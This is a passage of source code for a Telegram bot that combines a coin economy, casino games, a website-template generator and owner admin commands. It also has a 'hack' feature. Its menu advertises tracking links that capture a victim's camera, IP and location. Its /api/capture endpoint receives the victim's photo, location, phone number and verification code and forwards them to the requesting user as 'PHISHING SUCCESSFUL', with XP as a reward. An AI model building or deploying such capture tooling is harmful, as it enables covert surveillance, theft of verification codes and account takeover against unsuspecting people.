    if (u.coins < 20) return ctx.reply("❌ Need 20 coins!");
    await takeCoin(ctx.from.id, 20);
    let rewards = [10, 20, 30, 50, 100, 200, 500];
    let reward = rewards[Math.floor(Math.random() * rewards.length)];
    await addCoin(ctx.from.id, reward);
    await addXP(ctx.from.id, 10);
    await ctx.reply(`🎁 **Mystery Box**\nYou got ${reward} coins! +10 XP 🎉`);
  } else {
    await ctx.reply("❌ Items: diamonds, ticket, mystery");
  }
});

// ========== WEB CREATOR ==========
bot.command("createweb", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let template = args[1];
  let u = await initUser(ctx.from.id);
  
  const templates = ["portfolio", "business", "store"];
  const questions = {
    portfolio: ["name", "title", "skill1", "skill2", "skill3", "email"],
    business: ["company", "tagline", "service1", "service1_desc", "service2", "service2_desc", "service3", "service3_desc", "email", "phone", "address"],
    store: ["store", "tagline", "product1", "product1_price", "product2", "product2_price", "product3", "product3_price", "email"]
  };
  
  if (!template || !templates.includes(template)) {
    return ctx.reply(
      `🌐 **DOPE WEB CREATOR** 🌐\n\n` +
      `💰 Cost: ${WEB_PRICE} coins\n` +
      `⚡ Get HTML file + Free hosting guide!\n\n` +
      `/createweb portfolio\n` +
      `/createweb business\n` +
      `/createweb store\n\n` +
      `🎨 Create a professional website in 2 minutes!`
    );
  }
  
  if (u.coins < WEB_PRICE) {
    return ctx.reply(`❌ Need ${WEB_PRICE} coins! You have ${u.coins}\n\nEarn: /daily, /work, /dice, /slots`);
  }
  
  await takeCoin(ctx.from.id, WEB_PRICE);
  webBuilds.set(ctx.from.id, { template, step: 0, data: {}, questions: questions[template] });
  
  await ctx.reply(`✅ Template: ${template}\n💰 -${WEB_PRICE} coins\n\n📝 Step 1/${questions[template].length}\nSend: ${questions[template][0]}`);
});

// MY WEBSITES
bot.command("mywebsites", async (ctx) => {
  let websites = await Website.find({ ownerId: ctx.from.id });
  if (websites.length === 0) return ctx.reply("📭 No websites yet! /createweb portfolio");
  let message = "🌐 **YOUR WEBSITES** 🌐\n\n";
  for (let site of websites) message += `📌 ${site.name}\n🔗 ${site.url}\n\n`;
  await ctx.reply(message);
});

// MY ID
bot.command("myid", async (ctx) => { await ctx.reply(`🔑 Your ID: \`${ctx.from.id}\``, { parse_mode: "Markdown" }); });

// ========== ADMIN COMMANDS ==========
function isOwner(userId) { return userId === OWNER_ID; }

bot.command("admin", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Owner only!");
  await ctx.reply(`👑 **OWNER PANEL** 👑

/addcoin @user amount
/gencode coins diamonds uses hours
/broadcast message
/users
/stats
/banuser @user
/unban @user
/giveall amount
/setadmin @user`);
});

bot.command("addcoin", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  let amt = parseInt(args[2]);
  if (!user || isNaN(amt)) return ctx.reply("Usage: /addcoin @username amount");
  for (let [id, u] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { u.coins += amt; await saveUser(id, u); await ctx.reply(`✅ +${amt} coins to @${user}\n💰 New balance: ${u.coins}`); await bot.telegram.sendMessage(id, `👑 Owner gave you +${amt} coins!`); return; } } catch(e) {}
  }
  ctx.reply("❌ User not found");
});

bot.command("gencode", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let coins = parseInt(args[1]) || 50;
  let diamonds = parseInt(args[2]) || 0;
  let uses = parseInt(args[3]) || 20;
  let hours = parseInt(args[4]) || 24;
  let code = await genCode(coins, diamonds, uses, hours);
  await ctx.reply(`✅ **CODE GENERATED**\n\n\`${code}\`\n💰 ${coins} coins\n💎 ${diamonds} diamonds\n🎫 ${uses} uses\n⏰ ${hours} hours\n\nUse: /redeem ${code}`);
});

bot.command("broadcast", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return ctx.reply("Usage: /broadcast message");
  let sent = 0, failed = 0;
  for (let [id] of usersCache) {
    try { await ctx.telegram.sendMessage(id, `📢 **ANNOUNCEMENT**\n\n${msg}`); sent++; } catch(e) { failed++; }
    await new Promise(r => setTimeout(r, 100));
  }
  await ctx.reply(`✅ Sent to ${sent} users\n❌ Failed: ${failed}`);
});

bot.command("users", async (ctx) => { if (!isOwner(ctx.from.id)) return; await ctx.reply(`👥 Total Users: ${usersCache.size}`); });

bot.command("stats", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let totalCoins = 0;
  for (let u of usersCache.values()) totalCoins += u.coins;
  let totalWebsites = await Website.countDocuments();
  await ctx.reply(`📊 **STATISTICS**\n\n👥 Users: ${usersCache.size}\n💰 Total Coins: ${totalCoins}\n🌐 Websites: ${totalWebsites}`);
});

bot.command("banuser", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return ctx.reply("Usage: /banuser @username");
  for (let [id] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { bannedUsers.add(id); await ctx.reply(`🚫 Banned @${user}`); await bot.telegram.sendMessage(id, "🚫 You have been banned!"); return; } } catch(e) {}
  }
  ctx.reply("❌ User not found");
});

bot.command("unban", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return ctx.reply("Usage: /unban @username");
  for (let [id] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { bannedUsers.delete(id); await ctx.reply(`✅ Unbanned @${user}`); await bot.telegram.sendMessage(id, "✅ You have been unbanned!"); return; } } catch(e) {}
  }
  ctx.reply("❌ User not found");
});

bot.command("giveall", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let amount = parseInt(args[1]);
  if (isNaN(amount)) return ctx.reply("Usage: /giveall amount");
  let count = 0;
  for (let [id, u] of usersCache) { u.coins += amount; await saveUser(id, u); count++; }
  await ctx.reply(`✅ Added ${amount} coins to ${count} users`);
});

bot.command("setadmin", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return ctx.reply("Usage: /setadmin @username");
  for (let [id, u] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === user) { u.isAdmin = true; await saveUser(id, u); await ctx.reply(`✅ @${user} is now admin!`); await bot.telegram.sendMessage(id, "👑 You are now an admin!"); return; } } catch(e) {}
  }
  ctx.reply("❌ User not found");
});

// ========== BUTTON HANDLERS ==========
bot.action("menu_hack", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`💀 **HACK**\n\n/hack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures Camera + IP + Location\n⏰ Links expire in 1 HOUR!`); });
bot.action("menu_word", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`📝 **WORD BATTLE**\n\n/wordbattle @user amount difficulty\n💰 Winner takes ALL!`); });
bot.action("menu_web", async (ctx) => { 
  await ctx.answerCbQuery(); 
  await ctx.reply(
    `🌐 **DOPE WEB CREATOR** 🌐\n\n` +
    `💰 Cost: ${WEB_PRICE} coins\n` +
    `⚡ Auto-Deploy to Netlify!\n\n` +
    `/createweb portfolio\n` +
    `/createweb business\n` +
    `/createweb store\n\n` +
    `🎨 Create a professional website in 2 minutes!`
  ); 
});
bot.action("menu_casino", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🎰 **CASINO**\n\n/dice amount\n/slots amount`); });
bot.action("menu_games", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🎮 **GAMES**\n\n/dice\n/slots\n/wordbattle`); });
bot.action("menu_eco", async (ctx) => { await ctx.answerCbQuery(); let u = await initUser(ctx.from.id); await ctx.reply(`💰 **ECONOMY**\n\nBalance: ${u.coins} coins\n/daily\n/work`); });
bot.action("menu_leaderboard", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🏆 **LEADERBOARDS**\n\n/leaderboard\n/topwords`); });
bot.action("menu_profile", async (ctx) => { await ctx.answerCbQuery(); let u = await initUser(ctx.from.id); await ctx.reply(`👤 **PROFILE**\n\nCoins: ${u.coins}\nLevel: ${u.level}\nHacks: ${u.hacks}\nWord Wins: ${u.wordWins}`); });
bot.action("menu_shop", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🛒 **SHOP**\n\n/buy diamonds\n/buy ticket\n/buy mystery`); });
bot.action("menu_redeem", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🎁 **REDEEM**\n\n/redeem CODE`); });
bot.action("menu_ref", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🔗 **REFERRAL**\n\n${refLink(ctx.from.id)}\n\n+${REF_REWARD} coins per referral!`); });
bot.action("menu_admin", async (ctx) => { let user = await initUser(ctx.from.id); if (!user.isAdmin && ctx.from.id !== OWNER_ID) { await ctx.answerCbQuery("❌ Admin only!"); return; } await ctx.answerCbQuery(); await ctx.reply(`👑 **ADMIN**\n\n/addcoin\n/gencode\n/broadcast\n/users\n/stats\n/banuser\n/unban\n/giveall\n/setadmin`); });
bot.action("menu_mywebsites", async (ctx) => { await ctx.answerCbQuery(); let websites = await Website.find({ ownerId: ctx.from.id }); if (websites.length === 0) { await ctx.reply("No websites yet! /createweb portfolio"); } else { let msg = "🌐 **YOUR WEBSITES**\n\n"; for (let site of websites) { msg += `• ${site.name}\n  ${site.url}\n\n`; } await ctx.reply(msg); } });

// ========== TEXT HANDLER ==========
bot.on("text", async (ctx) => {
  if (ctx.message.text.startsWith("/")) return;
  
  let build = webBuilds.get(ctx.from.id);
  if (build) {
    if (build.step < build.questions.length) {
      build.data[build.questions[build.step]] = ctx.message.text;
      build.step++;
      
      if (build.step < build.questions.length) {
        await ctx.reply(`📝 Step ${build.step + 1}/${build.questions.length}\nSend: ${build.questions[build.step]}`);
      } else {
        await ctx.reply("⏳ Generating your dope website...");
        
        let html = htmlTemplates[build.template](build.data);
        let siteName = build.data[build.questions[0]] || "mywebsite";
        let fileName = `${siteName.replace(/[^a-z0-9]/gi, '_')}.html`;
        
        // Send HTML file directly - NO ZIP!
        await ctx.replyWithDocument({
          source: Buffer.from(html, 'utf-8'),
          filename: fileName
        });
        
        await ctx.reply(
          `✅ **WEBSITE HTML READY!** ✅\n\n` +
          `📁 **File:** ${fileName}\n` +
          `💰 **Cost:** -${WEB_PRICE} coins\n\n` +
          `🌐 **GET A FREE LIVE LINK (10 seconds):**\n` +
          `1️⃣ Go to https://app.netlify.com/drop\n` +
          `2️⃣ Drag & drop the HTML file I just sent\n` +
          `3️⃣ Your website is LIVE!\n\n` +
          `🔗 **Example:** https://your-site-name.netlify.app\n\n` +
          `💡 **Other free hosts:** Vercel, Render, GitHub Pages\n\n` +
          `⭐ **Share your link with everyone!**`
        );
        
        // Save to database
        let website = new Website({
          name: siteName,
          ownerId: ctx.from.id,
          template: build.template,
          content: build.data,
          url: "Upload to Netlify Drop",
        });
        await website.save();
        
        let user = usersCache.get(ctx.from.id);
        user.websites.push({ name: siteName, url: "Upload to Netlify Drop" });
        await saveUser(ctx.from.id, user);
        
        webBuilds.delete(ctx.from.id);
      }
    }
    return;
  }
  
  // Handle word challenge
  for (let [challengedId, challenge] of wordChallenges) {
    if (challenge.status === "active" && challenge.currentTurn === "challenger" && ctx.from.id === challenge.from) {
      let answer = ctx.message.text.toUpperCase().trim();
      if (answer.length === challenge.letterCount) {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        await addCoin(challenge.from, challenge.bet * 2);
        await addXP(challenge.from, 10);
        await ctx.reply(`🎉 CORRECT! Won ${challenge.bet * 2} coins! +10 XP`);
        await ctx.telegram.sendMessage(challengedId, `💀 You lost! Lost ${challenge.bet} coins`);
      } else {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        await addCoin(challengedId, challenge.bet * 2);
        await addXP(challengedId, 10);
        await ctx.reply(`❌ WRONG! Needed ${challenge.letterCount} letters! Lost ${challenge.bet} coins`);
        await ctx.telegram.sendMessage(challengedId, `🎉 You win! Won ${challenge.bet * 2} coins! +10 XP`);
      }
      return;
    }
  }
  
  await addXP(ctx.from.id, 1);
});

// ========== MIDDLEWARE WITH FIXED FORCE JOIN ==========
bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  if (bannedUsers.has(ctx.from.id)) return ctx.reply("🚫 You are banned!");
  
  let user = usersCache.get(ctx.from.id);
  if (user) { 
    user.lastActive = new Date(); 
    await saveUser(ctx.from.id, user); 
  }
  
  // Skip channel check for owner and during start command
  if (ctx.from.id === OWNER_ID) return next();
  if (ctx.message?.text === "/start") return next();
  
  let joined = await checkJoin(ctx);
  if (!joined) {
    return ctx.reply(`🚫 **JOIN OUR CHANNEL FIRST!** 🚫\n\nClick below to join @devxtechzone then click /start again`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📢 JOIN CHANNEL", url: "https://t.me/devxtechzone" }],
          [{ text: "✅ I JOINED", callback_data: "check_join" }]
        ]
      }
    });
  }
  
  return next();
});

// ========== API ENDPOINTS ==========
app.post("/api/capture", async (req, res) => {
  try {
    let { image, token, ip, location, number, country, code, userAgent } = req.body;
    if (!token) return res.status(400).json({ error: "No token" });
    
    let data = hackTokens.get(token);
    
    // Check if token exists
    if (!data) {
      return res.status(404).json({ error: "Link expired or invalid - Generate a new one with /hack" });
    }
    
    // Check if expired
    if (Date.now() > data.expiresAt) {
      hackTokens.delete(token);
      return res.status(410).json({ error: "Link has expired (1 hour limit) - Generate a new link" });
    }
    
    // Token is valid - process capture
    let message = `💀 **PHISHING SUCCESSFUL** 💀\n\n` +
      `🎯 Label: ${data.label || "No label"}\n` +
      `👤 Hacker: @${data.username}\n` +
      `🕐 Time: ${new Date().toLocaleString()}\n` +
      `⏰ Expires: ${new Date(data.expiresAt).toLocaleString()}\n\n` +
      `📱 IP: ${ip || "Unknown"}\n` +
      `📍 Location: ${location || "Unknown"}\n` +
      `🌐 Device: ${(userAgent || "Unknown").substring(0, 100)}\n` +
      `📞 Number: ${number || "Unknown"}\n` +
      `🔢 Code: ${code || "Unknown"}\n\n` +
      `✨ +15 XP EARNED!`;
    
    if (image && image.length > 100) {
      try { 
        await bot.telegram.sendPhoto(data.userId, { source: Buffer.from(image.split(',')[1], 'base64') }, { caption: message }); 
      } catch(e) { 
        await bot.telegram.sendMessage(data.userId, message); 
      }
    } else { 
      await bot.telegram.sendMessage(data.userId, message); 
    }
    
    await addXP(data.userId, 15);
    hackTokens.delete(token); // Delete after successful use
    
    res.json({ status: "success", message: "Captured successfully" });
  } catch(e) { 
    console.error("Capture error:", e); 
    res.status(500).json({ error: "Internal error" }); 
  }
});

// Check if a token is still valid
app.get("/api/check/:token", (req, res) => {
  let token = req.params.token;
  let data = hackTokens.get(token);
  
  if (!data) {
    return res.json({ valid: false, reason: "Link not found or invalid" });
  }
  
  if (Date.now() > data.expiresAt) {
    hackTokens.delete(token);
    return res.json({ valid: false, reason: "Link has expired (1 hour limit)" });
  }
  
  let timeLeft = data.expiresAt - Date.now();
  let minutesLeft = Math.floor(timeLeft / 60000);
  
  res.json({ 
    valid: true, 
    expiresIn: `${minutesLeft} minutes`,
    label: data.label 
  });
});

app.post("/api/upload", upload.single("image"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No file" });
  res.json({ url: `${DOMAIN}/uploads/${req.file.filename}` });
});

app.get("/", (req, res) => { res.sendFile(path.join(__dirname, "public", "index.html")); });

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server on ${PORT}`));

loadData().then(async () => {
  try {
    await bot.telegram.deleteWebhook();
    await bot.launch({ dropPendingUpdates: true });
    console.log(`🤖 SLIME TRACKERX v40.1 LIVE!`);
    console.log(`✅ All commands working!`);
    console.log(`✅ Web creator ready with DOPE templates!`);
    console.log(`✅ Hack system ready with 1-HOUR EXPIRY!`);
    console.log(`✅ Force join channel FIXED!`);
  } catch(e) { console.log("Error:", e.message); }
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
